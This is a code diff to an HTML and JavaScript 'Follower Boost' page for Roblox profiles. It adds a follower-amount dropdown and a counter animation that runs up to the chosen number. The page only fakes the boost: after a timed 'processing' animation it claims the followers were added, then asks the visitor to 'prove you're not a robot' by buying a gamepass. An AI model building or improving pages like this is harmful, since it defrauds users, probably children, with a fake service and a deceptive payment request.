@@ -58,6 +58,19 @@
             font-family: 'sfregular';
         }
 
+        .follower-select {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border: 2px solid #181819;
+            border-radius: 8px;
+            background: #1D1D1E;
+            color: white;
+            font-size: 1rem;
+            font-family: 'sfregular';
+            cursor: pointer;
+        }
+
         .start-button {
             background: linear-gradient(180deg, #6999FC 0%, #4983FB 100%);
             border: 2px solid #FFFFFF1A;
@@ -146,6 +159,11 @@
     <div class="container">
         <h1>Follower Boost</h1>
         <input type="text" class="input-box" id="profileLink" placeholder="Paste your Roblox profile link" required>
+        <select class="follower-select" id="followerAmount">
+            <option value="1">1 Follower</option>
+            <option value="100">100 Followers</option>
+            <option value="1000" selected>1000 Followers</option>
+        </select>
         <button id="startButton" class="start-button" onclick="boostFollowers()">Start</button>
         <div class="response-area" id="responseArea">
             <p id="responseText"></p>
@@ -161,6 +179,7 @@
     <script>
         function boostFollowers() {
             const profileLink = document.getElementById('profileLink').value.trim();
+            const followerAmount = parseInt(document.getElementById('followerAmount').value);
             const responseArea = document.getElementById('responseArea');
             const responseText = document.getElementById('responseText');
             const loadingScreen = document.getElementById('loadingScreen');
@@ -179,16 +198,17 @@
             loadingScreen.style.display = 'flex';
             responseArea.style.display = 'none';
 
-            // Animate follower counter
+            // Animate follower counter based on selected amount
             let count = 0;
-            const maxCount = 1000;
+            const maxCount = followerAmount;
+            const increment = Math.max(1, Math.floor(maxCount / 20)); // Adjust increment for smooth animation
             const interval = setInterval(() => {
-                count += 50;
-                followerCounter.textContent = `+${count} followers`;
+                count += increment;
                 if (count >= maxCount) {
+                    count = maxCount;
                     clearInterval(interval);
-                    followerCounter.textContent = '+1000 followers';
                 }
+                followerCounter.textContent = `+${count} followers`;
             }, 100); // Increment every 100ms
 
             // Show result after "processing"
@@ -196,7 +216,7 @@
                 loadingScreen.style.display = 'none';
                 responseArea.style.display = 'block';
                 startButton.style.display = 'none'; // Hide the Start button
-                responseText.innerHTML = 'Followers added! Prove you’re not a robot by <a onclick="verifyPurchase()">buying this gamepass</a>.';
+                responseText.innerHTML = `Added ${followerAmount} followers! Prove you’re not a robot by <a onclick="verifyPurchase()">buying this gamepass</a>.`;
             }, 3000); // 3-second "processing" time
         }
 
